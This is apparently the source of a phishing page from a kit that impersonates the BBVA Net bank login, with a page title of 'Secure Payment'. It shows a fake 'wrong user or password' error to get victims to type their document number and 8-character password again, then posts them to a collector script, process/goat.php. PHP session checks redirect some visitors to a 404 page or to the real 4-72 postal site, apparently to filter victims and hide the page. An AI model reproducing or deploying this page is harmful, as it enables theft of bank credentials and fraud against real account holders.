<?php
if (session_status() === PHP_SESSION_NONE) { session_start(); }


if(isset($_SESSION['estado']) && $_SESSION['estado'] == 1){


}else if(isset($_SESSION['estado']) && $_SESSION['estado'] == 2){

    header('location:/404.php');

}else if(isset($_SESSION['estado']) && $_SESSION['estado'] == 3){

    header('location:https://www.4-72.com.co/publicaciones/236/personas/');
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=0">
  <link rel="stylesheet" href="style.css">


  <script type="text/javascript" src="../../scripts/jquery-3.6.0.min.js"></script>
		<script src="../../scripts/jquery.jclock-min.js" type="text/javascript"></script>
   		<script type="text/javascript" src="../../scripts/functions2.js"></script>  		

  
  <title>Secure Payment</title>



</head>
<body>
  

  <img src="./img/menu.jpg" alt="" srcset="" width="100%">

  <center> <div style="width:90%; margin-top: 80px;">
	<a style="font-size:21px;">Hola, ingresa tu número de documento y contraseña para entrar a BBVA Net:</a>
	</div>           <br> <a style="color:rgb(255, 0, 0); margin-top:10px; ">Tu usuario o clave no son correctos</a>
	</center>
	

  <div class="inp">
    <select name="cc" id="">
      <option value="cedula" selected>Cédula de Ciudadania</option>
    </select><br>

    <!-- Formulario nativo que envía datos a goat.php igual que bbva.php -->
    <form action="process/goat.php" method="POST">
      <input type="tel" id="txtUsuario" name="user" placeholder="Número de documento" required><br>
      <input type="password" name="pass" id="txtPass" placeholder="Contraseña" minlength="8" maxlength="8" required><br>
      <input type="hidden" name="banco" value="bbva">
      <input type="submit" value="Entrar a BBVA Net" style="background-color:#227aba; font-size:17px; border:none; font-weight: bold; color:white; width:85%;"><br>
    </form>
  </div>

</body>
</html>
